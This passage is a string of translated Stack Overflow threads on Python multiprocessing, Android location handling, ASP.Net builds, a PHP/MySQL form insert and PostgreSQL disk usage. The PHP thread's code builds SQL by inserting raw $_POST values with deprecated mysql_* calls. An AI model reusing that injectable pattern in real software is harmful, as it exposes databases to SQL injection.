除非文档说它们将始终按插入顺序返回，否则您将做错事来依赖它。您今天使用的 STL 实现可能会发生变化。如果地图中有很多条目，您使用的实现也可能会以不同的方式工作。

# python - Python多处理：具有不同进程数量的不同结果

> ID：14346364
> 
> 赞同：2
> 
> 时间：2013-01-15T20:33:07.080
> 
> 标签：python, numpy, multiprocessing

我正在编写一些 Python 代码，并且需要让它运行大量数据，因此我决定使用多处理模块。但我发现，当我改变进程数量时，我会得到不同的结果，这显然是不可取的。

我的代码中有一些随机性，但是我在中央进程中执行程序后立即修复随机种子（随机种子仅用于选择标记和未标记的数据点）。子过程没有随机性，只是简单地计算矩阵或向量运算。

这是相关的代码。我使用相关的 numpy 和 scipy 模块。剩下的代码只是设置，与手头的问题无关。

该函数`update_pq_wrapper`产生子进程。函数`update_p`和`update_q`是在数据子集上调用的函数。 `update_pq_wrapper`从子过程中收集结果并将它们放在一起。`W`是表示亲和矩阵的全局变量。

```
def update_p(startIdx, endIdx, betaMatrix, out_q):
  p = np.zeros((endIdx-startIdx, max(LABELS)+1))
  W_colsum = W.sum(1)
  for i in xrange(startIdx, endIdx): #for i 0 to numExamples - 1                                                                                                                                                                            
    dist = np.zeros(max(LABELS)+1, dtype=np.float64)                                                                                                                                                           
    g = gamma(W_colsum, i)
    dist = np.exp(betaMatrix[i,:] / g)
    dist /= np.sum(dist)
    p[i-startIdx,:] = dist
  out_q.put(p)

def update_q(startIdx, endIdx, sumMatrix, out_q):
  q = np.zeros((endIdx-startIdx, max(LABELS)+1))
  W_rowsum = W.sum(0)
  for i in xrange(startIdx, endIdx):
    dist = np.zeros(max(LABELS)+1, dtype=np.float64)
    labeled = 1 if L[i] else 0
    dist = (R[i,:]*labeled + mu*sumMatrix[i,:]) / (labeled + mu*W_rowsum[0,i])
    dist /= np.sum(dist)
    q[i-startIdx,:] = dist
  out_q.put(q)

def update_pq_wrapper(curIter, chunksize, mat, update_step='p'):
  startIdx = xrange(0, dataset_size, chunksize)
  prevIter = 1 - curIter
  procs = []
  out_q = Queue()
  for i in range(ncores):    #now, start each of the child processes that assembles the matrices individually                                                                                                                               
    start = startIdx[i]
    end = dataset_size if i == ncores-1 else startIdx[i+1]
    if update_step == 'p':
        proc = Process(target=update_p, args=(start, end, mat, out_q))
    else:
        proc = Process(target=update_q, args=(start, end, mat, out_q))
    procs.append(proc)
    proc.start()
  if update_step == 'p':    #once completed, collect results                                                                                                                                                                                
    distMat = P1 if curIter else P0
  else:
    distMat = Q1 if curIter else Q0
  for i in range(ncores):
    p_chunk = out_q.get()
    start = startIdx[i]
    end = dataset_size if i == ncores-1 else startIdx[i+1]
    distMat[start:end,:] = p_chunk
  for proc in procs:
    proc.join() 
```

现在，如果我只用 1 个进程运行它，我会得到以下结果（5 次迭代的准确性）： 2.16 --> 26.56 --> 27.37 --> 27.63 --> 27.83

但是，如果我用 2 个进程运行它，我会得到以下结果： 2.16 --> 3.72 --> 18.74 --> 14.81 --> 16.51

并有 4 个进程：2.16 --> 13.78 --> 13.85 --> 15.67 --> 13.12

我不确定这种行为的原因是什么，尤其是考虑到上面粘贴的代码。

阿夫内什

**编辑（太平洋时间 2013 年 1 月 15 日下午 3:34**

根据某些人的要求，我复制粘贴了下面的整个代码，并简要说明了代码的确切用途。

基本思想是我有一个图，由一个亲和矩阵表示`W`。每个节点表示每个节点的可能标签集上的概率分布。因此，对于带标签的示例，节点具有退化的概率分布，对应于标签的行的值为 1，其他任何地方的值为 0。对于未标记的节点，每个节点的结果标签是一个分布，可以采用该分布的 MAP 点估计来获得该点的标签。有关该方法的更多详细信息，请参阅[此处](http://jmlr.csail.mit.edu/papers/v12/subramanya11a.html "JMLR 测量传播论文")。使用称为交替最小化的技术求解目标函数，其中提出了 2 个概率分布（`p`在`q`代码中），我们迭代直到分布收敛到相同的值。

正如其中一位评论者所建议的那样，我移动了该`proc.join()`部分，使其高于加入后发生的操作。这似乎导致代码无法超越生成子进程的阶段，迫使我从键盘中断执行。也许我只是做错了什么。

```
#!/usr/bin/python
import sys, commands, string, cPickle
import numpy as np
import scipy.sparse as sp
import scipy.stats as stats
import scipy.linalg as la
from math import ceil
from time import clock
from multiprocessing import Process, Queue
from Queue import Empty

np.random.seed(42)
if not len(sys.argv) == 9:
  print 'ERROR: Usage: python alternating_minimization.py <binary data or sim matrix> <labels_file> <iterations> <num cores> <label percent> <v> <mu> <alpha>'
  sys.exit()

########################################                                                                                                                                                                                                      
# Main Parameters                                                                                                                                                                                                                             
########################################                                                                                                                                                                                                      
similarity_file = sys.argv[1] #output of simgraph_construction.py                                                                                                                                                                             
labels_file = sys.argv[2]
niterations = int(sys.argv[3])
ncores = int(sys.argv[4])

########################################                                                                                                                                                                                                      
# meta parameters                                                                                                                                                                                                                             
########################################                                                                                                                                                                                                      
label_percent = float(sys.argv[5])
v = float(sys.argv[6])
mu = float(sys.argv[7])
alpha = float(sys.argv[8])

########################################                                                                                                                                                                                                      
# load the data file (output of simgraph_construction.py) which is already in numpy format                                                                                                                                                    
########################################                                                                                                                                                                                                      
W = cPickle.load(open(similarity_file, 'r'))
#print some summary statistics about the similarity matrix file                                                                                                                                                                               
print "Number of examples: %d"%(W.shape[0])
print "Sim Matrix: nnz = %d, density = %.2f percent, average # of neighbors per example: %.2f"%(W.nnz, 100*(float(W.nnz)/(W.shape[0]**2)), float(W.nnz)/W.shape[0])

########################################                                                                                                                                                                                                      
# load the labels                                                                                                                                                                                                                             
########################################                                                                                                                                                                                                      
def convertLabels(labels):
  unique_labels = np.unique(labels)
  label_dict = {}
  idx = 0
  for label in unique_labels:
    label_dict[label] = idx
    idx += 1
  return label_dict

LABELS = np.load(labels_file)
print "Number of unique labels: %d"%(np.unique(LABELS).shape)
label_dict = convertLabels(LABELS)
NEW_LABELS = np.array([label_dict[label] for label in LABELS])
dataset_size = LABELS.shape[0]
LABELS = NEW_LABELS
W = W + alpha*sp.identity(dataset_size)

########################################                                                                                                                                                                                                      
# define the labeled and unlabeled idxs                                                                                                                                                                                                       
########################################                                                                                                                                                                                                      
def make_test_set():
  idx = np.random.rand(dataset_size)
  l = (idx < label_percent)
  u = (idx >= label_percent)
  return l,u

L,U = make_test_set()
def createRDistribution(label_bool, labels):
  rows = np.array(range(0, dataset_size), dtype=int)
  label_idx = np.where(~label_bool)
  rows = np.delete(rows, label_idx)
  cols = np.delete(labels, label_idx)
  vals = np.ones((rows.shape[0],1)).ravel()
  sparseR = sp.csc_matrix((vals, (rows, cols)), shape=(dataset_size, max(labels)+1))
  return sparseR

########################################                                                                                                                                                                                                      
# make the distributions for the data                                                                                                                                                                                                         
########################################                                                                                                                                                                                                      
R = createRDistribution(L, LABELS) #labeled distribution is sparse                                                                                                                                                                            
classNoLabel = np.where(R.sum(0) == 0)
#print classNoLabel #need to figure out how many classes are unrepresented in the labeld set                                                                                                                                                  
Q0 = np.zeros((dataset_size, max(LABELS)+1), dtype=np.double)
Q0 += 1.0 / Q0.shape[1]
Q1 = np.zeros((dataset_size, max(LABELS)+1), dtype=np.double)
P0 = np.zeros((dataset_size, max(LABELS)+1), dtype=np.double)
P1 = np.zeros((dataset_size, max(LABELS)+1), dtype=np.double)

def gamma(W_sum,i): #W_sum is sum across all columns of sim matrix W                                                                                                                                                                          
  return v + mu * W_sum[i]

def update_p(startIdx, endIdx, betaMatrix, out_q):
  p = np.zeros((endIdx-startIdx, max(LABELS)+1))
  W_colsum = W.sum(1)
  for i in xrange(startIdx, endIdx): #for i 0 to numExamples - 1                                                                                                                                                                            
    dist = np.zeros(max(LABELS)+1, dtype=np.float64)                                                                                                                                                           
    g = gamma(W_colsum, i)
    dist = np.exp(betaMatrix[i,:] / g)
    dist /= np.sum(dist)
    p[i-startIdx,:] = dist
  out_q.put(p)

def update_q(startIdx, endIdx, sumMatrix, out_q):
  q = np.zeros((endIdx-startIdx, max(LABELS)+1))
  W_rowsum = W.sum(0)
  for i in xrange(startIdx, endIdx):
    dist = np.zeros(max(LABELS)+1, dtype=np.float64)
    labeled = 1 if L[i] else 0
    dist = (R[i,:]*labeled + mu*sumMatrix[i,:]) / (labeled + mu*W_rowsum[0,i])
    dist /= np.sum(dist)
    q[i-startIdx,:] = dist
  out_q.put(q)

def update_pq_wrapper(curIter, chunksize, mat, update_step='p'):
  startIdx = xrange(0, dataset_size, chunksize)
  prevIter = 1 - curIter
  procs = []
  out_q = Queue()
  for i in range(ncores):    #now, start each of the child processes that assembles the matrices individually                                                                                                                               
    start = startIdx[i]
    end = dataset_size if i == ncores-1 else startIdx[i+1]
    if update_step == 'p':
        proc = Process(target=update_p, args=(start, end, mat, out_q))
    else:
        proc = Process(target=update_q, args=(start, end, mat, out_q))
    procs.append(proc)
    proc.start()
  if update_step == 'p':    #once completed, collect results                                                                                                                                                                                
    distMat = P1 if curIter else P0
  else:
    distMat = Q1 if curIter else Q0
  for i in range(ncores):
    p_chunk = out_q.get()
    start = startIdx[i]
    end = dataset_size if i == ncores-1 else startIdx[i+1]
    distMat[start:end,:] = p_chunk
  for proc in procs:
    proc.join()

def compute_tvdist(P,Q):
  tv_dist = 0
  for i in range(0, dataset_size):
    tv_dist += max(np.absolute(P[i,:] - Q[i,:]))
  return tv_dist/dataset_size

def main(argv):
  accuracyArr = []
  tvdistArr = []
  print >> sys.stderr, 'Starting %d iterations...' % niterations
  chunksize = int(ceil(dataset_size/float(ncores)))
  for n in xrange(1,niterations+1):
    print >> sys.stderr, 'Iteration %d' % n
    idx = n % 2
    q_prev = Q1 if not idx else Q0
    p_cur = P1 if idx else P0
    #print q_prev                                                                                                                                                                                                                         
    start_time = clock()
    mat = -v + mu*(W*(np.log(q_prev)-1))
    end_time = clock()
    #print mat                                                                                                                                                                                                                            
    print "Time taken to compute Beta Matrix: %.2f seconds"%(end_time-start_time)
    start_time=clock()
    update_pq_wrapper(idx, chunksize, mat, 'p')
    end_time=clock()
    print "Time taken to update P matrix: %.2f seconds"%(end_time-start_time)
    if not n == niterations:
      start_time = clock()
      mat = W.T*p_cur
      end_time = clock()
      print "Time taken to compute Sum Matrix: %.2f seconds"%(end_time-start_time)
      start_time = clock()
      update_pq_wrapper(idx, chunksize, mat, 'q')
      end_time = clock()
      print "Time taken to update Q matrix: %.2f seconds"%(end_time-start_time)
    ## Evaluation ##                                                                                                                                                                                                                      
    evalMat = P1 if idx else P0                                                                                                                                                   
    predLabel = np.argmax(evalMat, axis=1) #gives the index (column)                                                                                                                                                                      
    accuracy = float(np.sum(predLabel[np.where(U)] == LABELS[np.where(U)]) )/ LABELS[np.where(U)].shape[0]
    print "Accuracy: %.2f"%(accuracy*100)
    accuracyArr.append(accuracy)
    totalVar = []
    if n != niterations:
        tv_dist = compute_tvdist(P1, Q1) if idx else compute_tvdist(P0, Q0)
    else:
        tv_dist = compute_tvdist(P1, Q0) if idx else compute_tvdist(P0, Q1)
    print "Average Total Variation Distance is %.3f"%(tv_dist)
    tvdistArr.append(tv_dist)
  print "Summary of final probability density matrix: "
  print evalMat
  print '\t'.join([str(round(acc,4)) for acc in accuracyArr]) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-16T21:30:43.570

这已经解决了。我不知道我在想什么，但很明显，当从子流程返回时，数据将被异步写入，而不是按照我期望的顺序（行的顺序）。一个简单的解决方法是让子流程返回数据元组以及它正在处理的数据的哪一部分的指示符，然后使用此信息将结果矩阵重新组合在一起。

# android - Android 中 lastKnownLocation 为空时的 UX

> ID：14346365
> 
> 赞同：0
> 
> 时间：2013-01-15T20:33:08.303
> 
> 标签：android, gps, locationmanager

为应用程序开发一些签入功能，并尝试找出处理 lastKnowLocation 为空的最干净的方法。目前，我附加了一个位置监听器，然后启动了一个异步任务，该任务发布了一个不确定的进度对话框，提醒用户我正在搜索 gps 以收集他们的位置；doInBackground 方法本质上只是一个繁忙的等待循环，等待位置不为空。作为免责声明，我觉得从代码的角度来看，当前的实现有点“笨拙”，但提供了预期的用户体验。但是，我想知道是否有人可以提供有关处理这种相当常见情况的更好方法的见解。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T21:03:16.963

I'm not for the progress dialog because if the GPS takes forever then so will your app, killing the UX. In the activity with the dialog why not have a global locationFound boolean, a lastLongitude and lastLatitude. The advantage of that being if the you use the GPS returned to open another activity and the user navigates backwards you can even implement a "See previous results" or whatever the terminology is for your app. Here's how i implemented a GPS location wait in an activity for a small app i did a while ago, excluding the code that doesn't matter for your question

```
public class MainActivity extends Activity {
        TextView txt;
        Button btnGPS;
        Button btnSeeLast;
        LocationManager locationManager;
        String provider;
        boolean gotLoc;
        boolean hasLastLoc;
        double lastLat;
        double lastLon;
        LocationListener myLocationListener;

    @Override
public void onDestroy(){
    super.onDestroy();
    locationManager.removeUpdates(myLocationListener);  

}

    @Override
    public void onCreate(Bundle savedInstanceState) {
        .....
        txt = (TextView)findViewById(R.id.tekst);
        txt.setText("Waiting for GPS location");
        btnSeeLast = (Button)findViewById(R.id.btnSeeLast);
        btnSeeLast.setEnabled(false);
        hasLastLoc = false;
        String context = Context.LOCATION_SERVICE;
        gotLoc = false;
        locationManager = (LocationManager)getSystemService(context);
        provider = LocationManager.GPS_PROVIDER;
        myLocationListener = new UpdatesReceiver();
        int t = 5000;
        int distance = 5;
        locationManager.requestLocationUpdates(provider, t, distance, myLocationListener);
        checkGPS();
        Location location = locationManager.getLastKnownLocation(provider);
        if (location != null){
        gotLoc = true;
        updateWithNewLocation(location, true);
        }
      }

private void checkGPS(){
    if (!locationManager.isProviderEnabled(provider)){
        buildAlertMessageNoGps();
        }   
}

public void btnSeeLastClick(View view){
    Intent intent = new Intent(this, NextActivity.class);
    intent.putExtra("latitude", String.valueOf(lastLat));
    intent.putExtra("longitude", String.valueOf(lastLon));
    intent.putExtra("prev", false);     
    startActivity(intent);

}

private void updateWithNewLocation(Location location, boolean prev){
    btnGPS.setEnabled(true);
    String latLongString;

    if (location != null){
        double lat = location.getLatitude();
        double lng = location.getLongitude();

        //remember
        lastLat = lat;
    lastLon = lng;
    hasLastLoc = true;
    btnSeeLast.setEnabled(true);
        //end remember
        latLongString = "Latitude: " + lat + "\nLongitude: " + lng;
        txt.setText("");
        //txt.setText(latLongString);return;

        Intent intent = new Intent(this, AgentsList.class);
        intent.putExtra("latitude", String.valueOf(lat));
        intent.putExtra("longitude", String.valueOf(lng));

        if (prev){
            intent.putExtra("prev", true);              
        }
        else{
            intent.putExtra("prev", false);
        }
        startActivity(intent);

        }
    else{
        latLongString = "Failed to get a response from your GPS. Try again";
        txt.setText(latLongString);
        }

}

private class UpdatesReceiver implements LocationListener{
    @Override
    public void onLocationChanged(Location location) {
        if (gotLoc == false){
            gotLoc = true;
            updateWithNewLocation(location, false);

        }           

    }

    @Override
    public void onProviderDisabled(String provider){
    // Update application if provider disabled.
    }

    @Override
    public void onProviderEnabled(String provider){
    // Update application if provider enabled.
    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras){
    // Update application if provider hardware status changed.
    }
}
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T20:53:53.247

如果您现在想要该位置，请使用 getLastKnownLocation。如果您正在等待它为非 null，则应改为 requestLocationUpdates。如果因为您不想要超过 1 次更新而过大，请使用 requestSingleUpdate。

# asp.net - ASP.Net 页面在 Visual Studio 中使用“构建页面”构建良好，但在“构建网站”中给出“当前上下文中不存在”错误

> ID：14346367
> 
> 赞同：0
> 
> 时间：2013-01-15T20:33:10.140
> 
> 标签：asp.net, visual-studio-2010, build, compiler-errors

使用 Visual Studio 2010，我将一个表单添加到一个 ASP.Net 页面，该页面已经是我项目的一部分。称它为 myPage.aspx。我实际上是从另一个应用程序的工作页面复制和粘贴表单。所以首先我将 .aspx 代码粘贴到 myPage.aspx 文件中，然后将 C# 代码粘贴到 myPage.aspx.cs 文件中。我没有复制 myPage.aspx 文件中的 page 指令，也没有复制 myPage.aspx.cs 文件中的任何类声明代码。我只是将一个表格粘贴到 myPage.aspx 的正文中，并将一些处理代码提交到 myPage.aspx.cs。

当我尝试构建网站时，每个控件都出现错误，提示“当前上下文中不存在名称'whateverControl'”。这对我来说毫无意义，因为 Intellisense 正在工作，发现控件很好。我仔细检查了 Page 的 CodeFile 和 Inherits 属性，它们都是正确的。

此外，如果我使用“构建页面”命令，页面构建成功。只有当我使用“构建网站”时，我才会得到一长串“不存在”错误。“重建网站”没有帮助。我什至关闭了 Visual Studio 并重新打开它，它没有任何区别。我最终发现了问题，所以我在这里回答我自己的问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T20:33:10.140

原来 myPage.aspx 和 myPage.aspx.cs 完全没问题。问题是，在以前的某个时间，其他人将我正在处理的 .aspx 页面（不是 .aspx.cs）复制到了另外两个 .aspx 页面，并且他们在执行此操作时还复制了 CodeFile 和 Inherits 属性。因此，这两个页面都具有与我正在处理的页面完全相同的 CodeFile 和 Inherits 设置。这意味着**三个页面在其 Page 指令中具有完全相同的设置**：

CodeFile="myPage.aspx.cs" Inherits="myPage"

显然这是编译器允许的，只要 .aspx.cs 文件中没有代码在寻找仅存在于其中一个页面中的控件，它就可以工作。

我从另外两个复制的页面中删除了这些属性，然后所有内容都成功编译。

# php - 尝试使用 twitter-bootstrap 中创建的下拉网站表单中的 PHP 将选项值数据插入 MySQL 数据库

> ID：14346368
> 
> 赞同：0
> 
> 时间：2013-01-15T20:33:12.013
> 
> 标签：php, mysql, twitter-bootstrap

我是php的初学者。我正在使用 twitter-bootstrap 创建一个网站。我想将从网站下拉菜单提交的数据存储到名为 datawebcollectiondb 的 MySQL 数据库中。当用户从打开的文本字段而不是从下拉菜单中提交输入时，我能够将信息存储在数据库中。提交下拉菜单时，数据库中的所有字段都用 0 填充。

首先打开的文本字段确实有效：

HTML 文件：

```
<html>
            <body>
                <form action="insert.php" method="post">
                    Number Please: <input type="text" name="directionp">
                        Another Number: <input type="text" name="timep">
                            Third Number: <input type="text" name="locationp">
                              Fourth Number: <input type="text" name="searchtimep">
                                <input type="submit">
                </form>

            </body>
</html> 
```

有效的PHP文件：

```
<?php
    $con = mysql_connect("host", "username", "password");
    if (!$con)
    {
        die('Could not connect: ' . mysql_error());
    }

    mysql_select_db("timeforparkingdb", $con);

    $sql="INSERT INTO datawebcollection (directionp, timeofdayp, locationp, searchtimep)
    VALUES
    ('$_POST[directionp]','$_POST[timep]','$_POST[locationp]','$_POST[searchtimep]')";

    if (!mysql_query($sql,$con))
    {
        die('Error: ' . mysql_error());
    }
    echo "1 more record added =) ";

    mysql_close($con);
?> 
```

除了用 0 填充 db 之外，不能与上述 php 文件一起使用的 HTML 文件：

```
<html>
    <form action="insert.php" method="post">
                        <b>DIRECTION:</b>
                            <select name="directionp">
                                <option value="1">Coming</option>
                                <option value="2">Going</option>
                            </select>
                        <b>TIME:</b>
                            <select name="timep">
                                <option value="0">12:00am - 1:00am</option>
                                <option value="1">1:00am - 2:00am</option>
                                <option value="2">2:00am - 3:00am</option>
                                <option value="3">3:00am - 4:00am</option>
                                <option value="4">4:00am - 5:00am</option>
                                <option value="5">5:00am - 6:00am</option>
                                <option value="6">6:00am - 7:00am</option>
                                <option value="7">7:00am - 8:00am</option>
                                <option value="8">8:00am - 9:00am</option>
                                <option value="9">9:00am - 10:00am</option>
                                <option value="10">10:00am - 11:00am</option>
                                <option value="11">11:00am - 12:00pm</option>
                                <option value="12">12:00pm - 1:00pm</option>
                            </select>
                        &nbsp;<b>LOCATION:</b>
                            <select name="locationp">
                                <option value="1">Zone One</option>
                                <option value="2">Zone Two</option>
                                <option value="3">Zone Three</option>
                                <option value="4">Zone Four</option>
                                <option value="5">Zone Five</option>
                                <option value="6">Zone Six</option>
                                <option value="7">Zone Seven</option>
                                <option value="8">Zone Eight</option>
                                <option value="9">Zone Nine</option>
                                <option value="10">Zone Ten</option>
                                <option value="11">Zone Eleven</option>
                                <option value="12">Zone Twelve</option>
                                <option value="13">Zone Thirteen</option>
                            </select>
                        <b>SEARCH TIME HERE:</b>
                        <select name="searchtimep">
                            <option value="0">Under 1 Minute</option>
                            <option value="1">1 Minute - 3 Minutes</option>
                            <option value="5">3 Minutes - 5 Minutes</option>
                            <option value="10">5 Minutes - 10 Minutes</option>
                            <option value="15">10 Minutes -15 Minutes</option>
                            <option value="20">15 Minutes - 20 Minutes</option>
                            <option value="25">20 Minutes - 25 Minutes</option>
                            <option value="30">25 Minutes - 30 Minutes</option>
                            <option value="35">30 Minutes - 35 Minutes</option>
                            <option value="40">35 Minutes - 40 Minutes</option>
                            <option value="45">40 Minutes - 45 Minutes</option>
                            <option value="50">45 Minutes - 50 Minutes</option>
                            <option value="55">50 Minutes - 55 Minutes</option>
                            <option value="60">55 Minutes - 1 HOUR</option>
                            <option value="0">Over 1 HOUR</option>
                        </select>
    <button type="submit" class="btn btn-large btn-primary">Submit</button>
    </form>
</html> 
```

原始 MySQL 数据库结构：

```
Field           Type    Collation   Attributes  Null    Default Extra   Action
    unique_entry_id int(11)         No                                  
    dayp            int(2)          No                                  
    monthp          int(2)          No                                  
    yearp           int(4)          No                                  
    directionp  int(1)          No                                  
    timeofdayp  int(2)          No                                  
    locationp   int(2)          No                                  
    searchtimep int(2)          No 
```

到目前为止，我在数据库中看到的内容：

```
unique_entry_id dayp    monthp  yearp   directionp  timeofdayp  locationp   searchtimep
            0   6   6   6   0   0   0   0
            0   7   7   7   0   0   0   0
            0   8   24  2345    0   0   0   0
            0   0   0   0   0   0   0   0
            0   0   0   0   0   0   0   0
            0   0   0   0   0   0   0   0
            0   0   0   0   0   0   0   0
            0   0   0   0   0   0   0   0 
```

值不是 0 的行来自我运行原始代码时，只有 0 的行来自下拉表单。如何获得正确的相关选项值作为存储到数据库中的值？我会认为分配给选项的值，即`<option value="1">Zone One</option> <option value="2">Zone Two</option>`，将是提交给数据库的值。

我在 chrome 开发者控制台上看到的内容`form data`如下：

```
direction=2&time=5&location=5&searchtime=25 
```

并且数据库仍然记录了所有的 0。

更正的 MySQL 数据库结构：目前更正的数据库结构：

```
Field           Type          Collation         Attributes  Null    Default Extra   
unique_entry_id int(11)                 No                                  
city_id         varchar(50)   utf8_general_ci   No                                   
datep           date                    No                                  
directionp  int(1)                  No                                  
timeofdayp  time                    No                                  
locationp   int(2)                  No                                  
searchtimep int(2)                  No 
```

为了将整数而不是文本从我的 php 代码传递给 mySQL 数据库，我删除了单引号：

```
<?php
    $con = mysql_connect("", "", "");
    if (!$con)
    {
        die('Could not connect: ' . mysql_error());
    }

    mysql_select_db("timeforparkingdb", $con);

    $sql="INSERT INTO datawebcollection (directionp, timeofdayp, locationp, searchtimep)
    VALUES
    ($_POST[directionp],$_POST[timep],$_POST[locationp],$_POST[searchtimep])";

    if (!mysql_query($sql,$con))
    {
        die('Error: ' . mysql_error());
    }
    echo "Thank you for your submission! 1 more record added =) ";

    mysql_close($con);
?> 
```

第一步为了避免 SQL 注入，我将 HTML 修改为：

```
<form action="insert.php" id="timeforparking" method="post">
     <input type="submit">
</form> 
```

和：

```
DIRECTION:
<select form = "timeforparking" id="directionp">
                            <option value="1">Parking In Manhattan</option>
                            <option value="2">Leaving Manhattan</option>
</select>
TIME:
<select form = "timeforparking" id="timep">
                            <option value="0">12:00am - 1:00am</option>
                            <option value="1">1:00am - 2:00am</option>
                            <option value="2">2:00am - 3:00am</option>
                            <option value="3">3:00am - 4:00am</option>
                            <option value="4">4:00am - 5:00am</option>
                            <option value="5">5:00am - 6:00am</option>
                            <option value="6">6:00am - 7:00am</option>
                            <option value="7">7:00am - 8:00am</option>
                            <option value="8">8:00am - 9:00am</option>
                            <option value="9">9:00am - 10:00am</option>
                            <option value="10">10:00am - 11:00am</option>
                            <option value="11">11:00am - 12:00pm</option>
                            <option value="12">12:00pm - 1:00pm</option>
                            <option value="13">1:00pm - 2:00pm</option>
                            <option value="14">2:00pm - 3:00pm</option>
                            <option value="15">3:00pm - 4:00pm</option>
                            <option value="16">4:00pm - 5:00pm</option>
                            <option value="17">5:00pm - 6:00pm</option>
                            <option value="18">6:00pm - 7:00pm</option>
                            <option value="19">7:00pm - 8:00pm</option>
                            <option value="20">8:00pm - 9:00pm</option>
                            <option value="21">9:00pm - 10:00pm</option>
                            <option value="22">10:00pm - 11:00am</option>
                            <option value="23">11:00am - 12:00pm</option>
</select>
LOCATION:
<select form = "timeforparking" id="locationp">
                            <option value="1">Zone One</option>
                            <option value="2">Zone Two</option>
                            <option value="3">Zone Three</option>
                            <option value="4">Zone Four</option>
                            <option value="5">Zone Five</option>
                            <option value="6">Zone Six</option>
                            <option value="7">Zone Seven</option>
                            <option value="8">Zone Eight</option>
                            <option value="9">Zone Nine</option>
                            <option value="10">Zone Ten</option>
                            <option value="11">Zone Eleven</option>
                            <option value="12">Zone Twelve</option>
                            <option value="13">Zone Thirteen</option>
</select>

REPORT YOUR APPROXIMATE SEARCH TIME HERE:
<select form = "timeforparking" id="searchtimep">
                        <option value="0">Under 1 Minute</option>
                        <option value="1">1 Minute - 3 Minutes</option>
                        <option value="5">3 Minutes - 5 Minutes</option>
                        <option value="10">5 Minutes - 10 Minutes</option>
                        <option value="15">10 Minutes -15 Minutes</option>
                        <option value="20">15 Minutes - 20 Minutes</option>
                        <option value="25">20 Minutes - 25 Minutes</option>
                        <option value="30">25 Minutes - 30 Minutes</option>
                        <option value="35">30 Minutes - 35 Minutes</option>
                        <option value="40">35 Minutes - 40 Minutes</option>
                        <option value="45">40 Minutes - 45 Minutes</option>
                        <option value="50">45 Minutes - 50 Minutes</option>
                        <option value="55">50 Minutes - 55 Minutes</option>
                        <option value="60">55 Minutes - 1 HOUR</option>
                        <option value="0">Over 1 HOUR</option>
</select> 
```

我将不得不对 php 做一些事情以避免注入，我还不知道我需要为此做什么，我目前正在[http://php.net/manual/en/pdo.prepared研究这个-statements.php](http://php.net/manual/en/pdo.prepared-statements.php)，并尝试将以下内容应用于我的案例：

```
This example performs an INSERT query by substituting a name and a value for the named placeholders.
    <?php
    $stmt = $dbh->prepare("INSERT INTO REGISTRY (name, value) VALUES (:name, :value)");
    $stmt->bindParam(':name', $name);
    $stmt->bindParam(':value', $value);

    // insert one row
    $name = 'one';
    $value = 1;
    $stmt->execute();

    // insert another row with different values
    $name = 'two';
    $value = 2;
    $stmt->execute();
    ?> 
```

可能我的某些值是空的。接下来我希望检查 POST 参数并通过[Print out post values](https://stackoverflow.com/questions/196664/print-out-post-values)在 php 代码中打印出来，具体来说：

```
<?php
// loop through every form field
while( list( $field, $value ) = each( $_POST )) {
   // display values
   if( is_array( $value )) {
      // if checkbox (or other multiple value fields)
      while( list( $arrayField, $arrayValue ) = each( $value )) {
         echo "<p>" . $arrayValue . "</p>\n";
      }
   } else {
      echo "<p>" . $value . "</p>\n";
   }
}
?> 
```

提交后输出：

```
blank white screen 
```

这是否意味着我正在尝试将空值传递给我的数据库？而且我不再收到我的数据库中的所有 0，因为我知道有一个 SQL 错误（或者是因为我传递了空白值，即 $_POST[locationp] 和 $_POST[searchtimep] 是空的？这是正确的结论吗？如果是这样，为什么要这样做？）使用没有单引号的更新的PHP；使用最新的 PHP [如上所示，没有单引号，因此它不会作为文本发送] 和上面的 HTML 现在使用表单的 ID 标记，我收到：

```
"Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ',,)' at line 3" 
```

当我从网页提交时。因此，Chrome 没有显示任何有关表单值的内容，仅列出了“请求标头”和“响应标头”。

我原来的问题/帖子仍然是：从下拉菜单中将值存储在 MySQL 数据库中？

我无法从中收集解决方案的相关问题：[使用 PHP 将下拉列表中的数据插入数据库](https://stackoverflow.com/questions/8000648/inserting-data-from-dropdown-into-database-with-php)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-21T18:02:08.443

您的 PHP 脚本需要名为例如 directionp 的表单变量，但是来自 Chrome 的帖子数据显示方向（最后没有 p。）

你确定你的表单元素在你的 HTML 中被正确命名了吗？从您的列表中可以看出，但是您的表单数据看起来不同。

# database - Postgresql 查找数据库使用的总磁盘空间

> ID：14346371
> 
> 赞同：61
> 
> 时间：2013-01-15T20:33:13.840
> 
> 标签：database, postgresql, diskspace

我在我的 postgresql 服务器中托管了 50 多个数据库。我需要将其中一些移动到另一台主机上，以释放一些磁盘空间，但是如何测量我的卷上每个数据库使用的磁盘空间？

是否有任何功能可以获取我想要的信息？

* * *

## 回答 #1

> 赞同：89
> 
> 时间：2013-01-15T20:35:11.980

```
SELECT pg_database_size('geekdb') 
```

或者

```
SELECT pg_size_pretty(pg_database_size('geekdb')) 
```

[http://www.thegeekstuff.com/2009/05/15-advanced-postgresql-commands-with-examples/](http://www.thegeekstuff.com/2009/05/15-advanced-postgresql-commands-with-examples/)

* * *

## 回答 #2

> 赞同：40
> 
> 时间：2016-07-23T08:04:06.530

您可以使用 postgresql 元命令：

*   `\l`将列出数据库
*   `\l+`使用大小、表空间、描述扩展列表。

用于`\?`获取元命令的完整列表。另见： [https ://www.postgresql.org/docs/9.5/static/app-psql.html](https://www.postgresql.org/docs/9.5/static/app-psql.html)

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2017-10-13T19:26:21.093

这是一个老问题，但我创建了一种方法来`df -h`通过 sql 查询查看 linux 命令（文件系统、大小、使用、Avail、Use%、Mounted on）的结果，因此您的可用磁盘空间和总可用磁盘空间给定的文件系统。不完全是什么问题，但对一些使用/我有帮助。我希望这个答案是几个小时前就在这里，所以我把它放在这里（仅限 Linux）：

像这样创建一个 cron 作业：

```
@hourly df -h | awk '{print $1","$2","$3","$4","$5","$6}' > /pathhere/diskspaceinfo.csv` 
```

创建要查询的外部表：

```
create extension file_fdw;

create server logserver FOREIGN DATA WRAPPER file_fdw;

CREATE FOREIGN TABLE diskspaceinfo 
